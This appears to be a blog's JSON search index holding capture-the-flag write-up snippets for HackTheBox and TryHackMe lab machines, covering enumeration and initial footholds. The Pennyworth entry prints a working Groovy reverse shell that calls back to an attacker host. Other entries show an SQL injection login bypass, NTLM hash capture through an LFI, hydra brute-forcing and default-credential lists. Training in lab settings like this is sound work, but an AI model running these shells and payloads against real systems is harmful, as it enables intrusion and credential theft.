[ { "title": "HackTheBox - Pennyworth", "url": "/posts/HTB-PennyWorth/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, easy, jenkins, groovy", "date": "2022-07-01 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Pennyworth from HackTheBox.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.193.169 (10.129.193.169)Host is up (1.2s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION8080/tcp open http Jetty 9.4.39.v20210325|_http-title: Site doesn't have a title (text/html;charset=utf-8).| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Jetty(9.4.39.v20210325)Found port 8080 open running jetty web server.WebLet’s navigate to port 8080.Found a login page for Jenkins.ffufLet’s run a directory scan.Let’s navigate to /oops page.This page reveals Jenkins version number. This version doesn’t seem to be vulnerable to anything serious.Let’s try some default default credentials and attempt to login. - admin:admin - admin:password - admin:qwerty123 - admin:root - root:root - root:admin - root:passwordWe managed to login using root:password.FootholdNow that we managed to login as root, we can use script console to get a reverse shell.At Jenkins Dashboard go to Manage Jenkins and then select Script Console.At the script console, we can run any Groovy program code we want. So we will run the following script that would give us a reverse shell.String host=\"10.10.10.10\";int port=9001;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();Next we need to setup a netcat listener to receive the shell.nc -lvnp 9001.Now press run and you should get a shell.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :)." }, { "title": "HackTheBox - Ignition", "url": "/posts/HTB-Ignition/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, easy", "date": "2022-06-27 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Ignition from HackTheBox.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.1.27 (10.129.1.27)Host is up (0.63s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http nginx 1.14.2|_http-title: Did not follow redirect to http://ignition.htb/|_http-server-header: nginx/1.14.2Port 80 is open running nginx web server.WebLet’s navigate to the web page.We get redirected to ignition.htb, so let’s add that to our /etc/hosts.Let’s try again.Nothings really useful.GobusterLet’s run a directory scan.gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://ignition.htb/ ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://ignition.htb/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s=============================================================== Starting gobuster in directory enumeration mode===============================================================/0 (Status: 200) [Size: 25803] /admin (Status: 200) [Size: 7095] /catalog (Status: 302) [Size: 0] [--&gt; http://ignition.htb/]/checkout (Status: 302) [Size: 0] [--&gt; http://ignition.htb/checkout/cart/]/cms (Status: 200) [Size: 25817] /contact (Status: 200) [Size: 28673] /enable-cookies (Status: 200) [Size: 27176] /errors (Status: 301) [Size: 185] [--&gt; http://ignition.htb/errors/] /Home (Status: 301) [Size: 0] [--&gt; http://ignition.htb/home] /home (Status: 200) [Size: 25802] /index.php (Status: 200) [Size: 25815] /media (Status: 301) [Size: 185] [--&gt; http://ignition.htb/media/] /opt (Status: 301) [Size: 185] [--&gt; http://ignition.htb/opt/] /rest (Status: 400) [Size: 52] /robots (Status: 200) [Size: 1] /robots.txt (Status: 200) [Size: 1] /setup (Status: 301) [Size: 185] [--&gt; http://ignition.htb/setup/] /soap (Status: 200) [Size: 391] /static (Status: 301) [Size: 185] [--&gt; http://ignition.htb/static/] /wishlist (Status: 302) [Size: 0] [--&gt; http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/] ===============================================================Let’s see what’s on /admin page.Found a Magento login page.FootholdLet’s try some of the common used passwords with the username admin. admin admin123 admin root123 admin password1 admin administrator1 admin changeme1 admin password123 admin qwerty123 admin administrator123 admin changeme123Nice! We got in.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :)." }, { "title": "HackTheBox - Responder", "url": "/posts/HTB-Responder/", "categories": "HackTheBox, Machines", "tags": "hackthebox, windows, easy, lfi, responder, winrm, cracking, john", "date": "2022-06-25 01:00:00 +0100", "snippet": " DescriptionHello Hackers, I hope you are doing well. Today we are doing Responder from HackTheBox.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 -p- {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.15985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.07680/tcp filtered pando-pubService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsThe target is a windows machine having 2 open ports, port 80 running Apache web server as well as WINRM on port 5985.WebNavigate to the web page. http://10.129.230.170/We get redirected to unika.htb . We need to add it to our hosts file (/etc/hosts)Now go to http://unika.htb/Looking through the page, we see a section where we can change language. When we change the option to GR, the website takes us to the German version of the website.In the URL we see the german.html page is loaded by the page parameter.This might be vulnerable to LFI (Local File Iclusion). LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was notintended to be an option for this application. A common example is when an application uses the path to afile as input. If the application treats this input as trusted, and the required sanitary checks are notperformed on this input, then the attacker can exploit it by using the ../ string in the inputted file nameand eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to codeexecution as well.FootholdSince this is a windows machine, one of the files we use to test for lfi is C:\\Windows\\System32\\drivers\\etc\\hosts.Now let’s add that to the url and request the file.http://unika.htb/index.php?page=C:\\Windows\\System32\\drivers\\etc\\hosts.Great! The target is vulnerable to LFI.We are going to leverage that and get a NTLM hash using a tool called Responder.When we run Responder, it will set up an SMB server listening for incoming connections. Then we’ll attempt to perform the NTLM authentication to that server using the LFI we found. Responder sends a challenge back for the server to encrypt with the user’s password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2.First, let’s run Responder : udo responder -I tun0with the Responder server ready, we tell the server to include a resource from our SMB server by setting the page parameter: http://unika.htb/index.php?page=//10.10.16.29/somefile.Great! We not only got a hash, but it’s Administrator’s hash.Put the hash in file so that we can crack it.Using john and rockyou wordlist, let’s crack the hash.Great! Got Administrator’s password.We have seen earlier that Winrm service is running. Using a tool called evil-winrm, we can connect to that service as Administrator with the password we cracked. evil-winrm -i 10.129.95.234 -u Administrator -p badmintonExcellent! We got in.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackTheBox - Crocodile", "url": "/posts/HTB-Crocodile/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, easy, hydra, bruteforce", "date": "2022-06-23 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Crocodile from HackTheBox.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.1.15 (10.129.1.15)Host is up (0.17s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist|_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.10.16.29| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Smash - Bootstrap Business TemplateService Info: OS: UnixWe found 2 open ports, 21 running a ftp server that allows anonymous login, and port 80 running apache web server.FTPLet’s login to the ftp server and download the files there.Let’s see what’s on those file.We have a list of username and a list of password.WebNavigate to the webpage. http://10.129.1.15/It’s a Bootstrap Business Template, nothing useful for us.GobusterLet’s run a directory scan using gobuster:gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.129.1.15/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.1.15/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 276]/.htaccess (Status: 403) [Size: 276]/.htpasswd (Status: 403) [Size: 276]/assets (Status: 301) [Size: 311] [--&gt; http://10.129.1.15/assets/]/css (Status: 301) [Size: 308] [--&gt; http://10.129.1.15/css/] /dashboard (Status: 301) [Size: 314] [--&gt; http://10.129.1.15/dashboard/]/fonts (Status: 301) [Size: 310] [--&gt; http://10.129.1.15/fonts/] /index.html (Status: 200) [Size: 58565] /js (Status: 301) [Size: 307] [--&gt; http://10.129.1.15/js/] /server-status (Status: 403) [Size: 276] ===============================================================There is /dashboard page. Let’s navigate to it.We get redirected to a login page.FootholdLet’s use the username and password lists we found earlier and attempt to login.Since we have a small list, no need for an automated tool. But we will do it anyway for demonstration purposes.First thing we need is the name of the parameters used for the login, for that, we either use burp suite and intercept the login request or just use the developer tool of the browser, we will use the latter.Press F12 and got to network tab.Now submit a test username and password (admin:admin for example) and try to login.Here we can see that there is three parameters; Username, Password and Submit.The username and password parameters’ values are the ones we’re going to brute force, the Submit value will stay ‘Login’.Next thing we need is an error message of a failed login so the script knows when we get a successful login.Now it’s time to craft the command. hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.1.15 http-post-form \"/login.php:Username=^USER^&amp;Password=^PASS^&amp;Submit='Login':Incorrect\".Great! We got the valid credentials. Let’s login.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackTheBox - Sequel", "url": "/posts/HTB-Sequel/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, easy, sql, mysql", "date": "2022-06-21 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Sequel from HackTheBox.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.95.232 (10.129.95.232)Host is up (0.14s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION3306/tcp open mysql?|_sslv2: ERROR: Script execution failed (use -d to debug)| mysql-info: | Protocol: 10| Version: 5.5.5-10.3.27-MariaDB-0+deb10u1| Thread ID: 65| Capabilities flags: 63486| Some Capabilities: FoundRows, SupportsLoadDataLocal, SupportsTransactions, Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, ODBCClient, DontAllowDatabaseTableColumn, InteractiveClient, Speaks41ProtocolNew, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments| Status: Autocommit| Salt: zJAEvF9)^$4x\";E'4mLq|_ Auth Plugin Name: mysql_native_password|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)Port 3306 is open and running mysql. MySQL is a service designed for database management: creating, modifying, and updating databases, changing and adding data, and more.FootholdIn order to communicate with the mysql database, we need a username and password, but sometimes there might be a misconfiguration allowing a passwordless authentication.To connect we use the command mysql with the following switches. -h : Connect to host. -u : User for log-in if not current user.As an initial attempt, we will try to log-in as the root user, naturally having the highest level of privileges on the system.Great! We managed to login without a password. We are placed in a MySQL service shell from where we can explore the tables and data therein that are available to us.The commands we will be using are the following: SHOW databases; : Prints out the databases we can access. USE {database_name}; : Set to use the database named {database_name}. SHOW tables; : Prints out the available tables inside the current database. SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.Let’s list the available databases with SHOW databases;.To be able to see what’s inside a database, we need to select it. We can use the command USE {database} to do that. In our case, the htb database seems relevant for our exercise so let’s select it.The next move is to prints our the available tables inside the htb database. We use the command SHOW tables;.There are two tables. Let’s check their content with the SELECT * FROM {table_name}; command.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackTheBox - Appointment", "url": "/posts/HTB-Appointment/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, machines, easy, sqli", "date": "2022-06-19 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Appointment from HackTheBox.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.197.23 (10.129.197.23)Host is up (0.18s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Login|_http-server-header: Apache/2.4.38 (Debian)Port 80 is open running Apache.WebLet’s navigate to the webpage.It’s a login form.FootholdOne of the first things to try is default credentials like admin:admin, admin:password, root:root.Unfortunately the default credentials don’t work.Next things is to test the login form for SQL injection vulnerability. SQL Injection is a common way of exploiting web pages that use SQL Statements thatretrieve and store user input data. If configured incorrectly, one can use this attackto exploit the well-known SQL Injection vulnerability, which is very dangerous. Thereare many different techniques of protecting from SQL injections, some of them beinginput validation, parameterized queries, stored procedures, and implementing a WAF (WebApplication Firewall) on the perimeter of the server’s network. However, instances canbe found where none of these fixes are in place, hence why this type of attack isprevalent, according to the OWASP Top 10 listof web vulnerabilities.One of the most common payload used for authentication bypass using SQL injection is ' or 1=1 --.Before we send the payload, let’s first understand how things work in the backend.The following PHP code demonstrates a dynamic SQL query in a login from. The user and password variables from the POST request is concatenated directly into the SQL statement.$query = \"SELECT * FROM users WHERE username='\" + $_POST[\"user\"] + \"' AND password= '\" + $_POST[\"password\"]$ + '\";\"When we submit our payload as username and password, the sql query would look like the following.SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''If the database executes the SQL statement above, all the users in the users table are returned. Consequently, the attacker bypasses the application’s authentication mechanism and is logged in as the first user returned by the query.Let’s break down the payload: The character ‘ will close the brackets in the SQL query. ‘OR’ in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement is true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account. The – character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment. This is like the # and // comment in python and javascript respectively.Great! Now let’s submit our payload and see what happens.We logged in successfully.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :)." }, { "title": "HackTheBox - Preignition", "url": "/posts/HTB-Preignition/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, easy", "date": "2022-06-17 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Preignition from HackTheBox. It’s an easy machine running a webserver, we find a login page through a directory scan, and use some default credentials to get in.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.200.99 (10.129.200.99)Host is up (0.20s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Welcome to nginx!We have a linux machine running nginx 1.14.2 on port 80.Weblet’s navigate to the webpage.It’s the default page of nginx.GobusterLet’s run directory scan:gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.129.200.99/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.129.200.99/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================12:49:14 Starting gobuster in directory enumeration mode===============================================================/admin.php (Status: 200) [Size: 999] ===============================================================Found /admin.php page. Let’s navigate to it.It’s a login page.FootholdThe first things to do when presented with a login page is to try some default credentials like : admin:admin - admin:password - root:root.Let’s try them.We managed to login using admin:admin.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackTheBox - Explosion", "url": "/posts/HTB-Explosion/", "categories": "HackTheBox, Machines", "tags": "hackthebox, windows, easy, rdp", "date": "2022-06-15 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Explosion from HackTheBox.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.190.225 (10.129.190.225) Host is up (0.29s latency).Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: EXPLOSION| NetBIOS_Domain_Name: EXPLOSION| NetBIOS_Computer_Name: EXPLOSION| DNS_Domain_Name: Explosion| DNS_Computer_Name: Explosion| Product_Version: 10.0.17763|_ System_Time: 2022-07-22T10:55:03+00:00| ssl-cert: Subject: commonName=Explosion| Not valid before: 2022-07-21T10:33:19 |_Not valid after: 2023-01-20T10:33:19 |_ssl-date: 2022-07-22T10:55:11+00:00; -1s from scanner time.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-07-22T10:55:06|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_clock-skew: mean: -1s, deviation: 0s, median: -1sWe see that we are dealing with a windows machine running smb and RDP on port 3389.FootholdLet’s try to connect to RDP using xfreerdp.The script need some switches for it to try to connect to the target. /u:{username} : Specifies the login username. /v:{target_IP} : Specifies the target IP of the host we would like to connect to.We will be login as user Administrator and submit a blank.xfreerdp /v:10.129.190.225 /u:AdministratorWait a little bit and we get a GUI access to the target as Administrator.For better access, use the following command xfreerdp /v:10.129.190.225 /u:Administrator /dynamic-resolution +clipboard. This will allow us to us clipboard and resize the pane.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :)." }, { "title": "HackTheBox - Redeemer", "url": "/posts/HTB-Redeemer/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, easy, redis", "date": "2022-06-13 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Redeemer from HackTheBox. It’s part of Tier 0 machines from Starting Point. The machines is running redis server.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 -p- {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.190.211 (10.129.190.211)Host is up (0.18s latency).Not shown: 65534 closed tcp ports (reset)PORT STATE SERVICE6379/tcp open redis Redis key-value store 5.0.7Port 6379 redis open running redis.Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a database, cache, and message broker. The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives to provide consistency.RedisLet’s connect to redis server with the following command: redis-cli -h 10.129.190.211. -h : specify the hostname of the target to connect to.We see a prompt in the terminal after we connect successfully.One of the basic Redis enumeration commands is info which returns information and statistics about theRedis server.$ redis-cli -h 10.129.190.211 130 ⨯10.129.190.211:6379&gt; info # Server redis_version:5.0.7 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:66bd629f924ac924redis_mode:standalone os:Linux 5.4.0-77-generic x86_64arch_bits:64 multiplexing_api:epoll atomicvar_api:atomic-builtingcc_version:9.3.0 process_id:753 run_id:b8bbf19594126f6908e496b84243e288875c41b0tcp_port:6379uptime_in_seconds:1175uptime_in_days:0hz:10configured_hz:10lru_clock:14317658executable:/usr/bin/redis-serverconfig_file:/etc/redis/redis.conf# Clients[** SNIP **]# Memory [** SNIP **]# Persistence[** SNIP **]# Stats[** SNIP **]# Replication[** SNIP **]# CPU[** SNIP **]# Clustercluster_enabled:0# Keyspacedb0:keys=4,expires=0,avg_ttl=0The keyspace section provides statistics on the main dictionary of each database. The statistics include thenumber of keys, and the number of keys with an expiration.Here we can see that there is only one database with index 0 and 4 keys.Let’s select the database with select 0.We can now list all the keys in the database with the command : KEYS *.To view the value of a key, we use get {key}.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :)." }, { "title": "HackTheBox - Dancing", "url": "/posts/HTB-Dancing/", "categories": "HackTheBox, Machines", "tags": "hackthebox, windows, smb, easy", "date": "2022-06-11 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Dancing from HackTheBox. It’s a windows machine running smb with a misconfigured share that permits to log in to it without valid credentials.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 -Pn {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.196.235 (10.129.196.235)Host is up (0.20s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-07-21T14:31:05|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_clock-skew: 3h59m59sWe see that the target is a windows machine running SMB - Server Message Block Protocol - and it is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information.In order to enumerate SMB, we can use a tool called enum4linux or smbclient.First, we need to list available share in the server, we do that with the following command : sudo smbclient -L 10.192.196.235. We will be prompt to submit a password, we just press enter without giving one. ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled. C$ - Administrative share for the C:\\ disk volume. This is where the operating system is hosted. IPC$ - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system. WorkShares - Custom share.FootholdLet’s connect to the custom share ‘WorkShares’. sudo smbclient \\\\\\\\10.129.196.235\\\\WorkShares.Great! The WorkShares share was misconfigured and allowed to log in without a password. Most of the commands of SMB are the same as the ones in linux, so we can list the content of the directory with ls.We found two directories, one for Amy.J and one for James.P.Let’s go into Amy’s directory and list it’s content.Found file named worknotes.txt. To View the file’s content, we first need to download it to our machine. To do that, we can use get worknotes.txt.We downloaded the file successfully, now let’s go to james directory and do the same steps as before.Found flag.txt file and downloaded it to our machine.To exit smb, enter quit, after that we can see the file we downloaded in our current directory.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackTheBox - Fawn", "url": "/posts/HTB-Fawn/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, ftp, easy", "date": "2022-06-09 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Fawn from HackTheBox. It’s a very easy machine from Starting Point.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.1.14 (10.129.1.14)Host is up (0.34s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.10.16.29| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txtService Info: OS: UnixPort 21 is open with anonymous login enabled.FootholdAnonymous login let us login to ftp with the username anonymous and a blank password.Let’s the content of the current directory.We found flag.txt file, we need to download it to our machine in order to see it’s content, to do that, we can use the command get flag.txt.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackTheBox - Meow", "url": "/posts/HTB-Meow/", "categories": "HackTheBox, Machines", "tags": "hackthebox, linux, telnet", "date": "2022-06-07 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Meow from HackTheBox. A very easy machine from Starting Point machines.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.129.1.17 (10.129.1.17)Host is up (0.15s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION23/tcp open telnet Linux telnetdService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 23 is open running telnet.The telnet service is an old service used for remote management of other hosts on the network. Telnet is inherently insecure. Credential information (usernames and passwords) submitted through telnet is not encrypted and is therefore vulnerable to identity theft. Because of that, it has been replaced with SSH (Secure Shell) that encrypts traffic in both directions.FootholdConnecting to telnet requires a combination of a username and password as we can see when we try to connect to it.Every time presented with a login form, the first things to try if we have no credentials is to try some default or top used credentials, some examples are : admin:admin admin:password root:rootLet’s see if we can login wit those credentials.The first two creds didn’t work. Let’s try the last one.Great! We have logged into the target system successfully.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - Easy Peasy", "url": "/posts/THM-Easy-Peasy/", "categories": "TryHackMe", "tags": "tryhackme, linux, steganography, john, cracking, cronjob, easy", "date": "2022-06-05 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Easy Peasy from TryHackMe. The machines has 3 open ports, 2 webservers and ssh on a non-default port. One of the webservers contains an image that has a hidden file inside of it, and the latter contains ssh credentials. For root access, there is a cronjob running every minute as root, modify the file to escalate privileges.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.196.34 (10.10.196.34)Host is up (0.070s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http nginx 1.16.1|_http-server-header: nginx/1.16.1|_http-title: Welcome to nginx!| http-robots.txt: 1 disallowed entry |_/We found a web server on port 80 running nginx 1.16.1.Let’s run another scan for all ports: sudo nmap --min-rate 5000 -p- 10.10.10.10Nmap scan report for 10.10.196.34Host is up (0.068s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http6498/tcp open unknown65524/tcp open unknownWe found another two ports, let’s scan the services on them:sudo nmap -sC -sV -T4 10.10.196.34 -p6498,65524Nmap scan report for 10.10.196.34 (10.10.196.34)Host is up (0.068s latency).PORT STATE SERVICE VERSION6498/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)| 256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)|_ 256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)65524/tcp open http Apache httpd 2.4.43 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.43 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThe first port is running ssh and the second port is another web server running apache.WebLet’s run some directory scans on the webserver we found.GobusterStarting with the webserver on port 80: gobuster dir -w 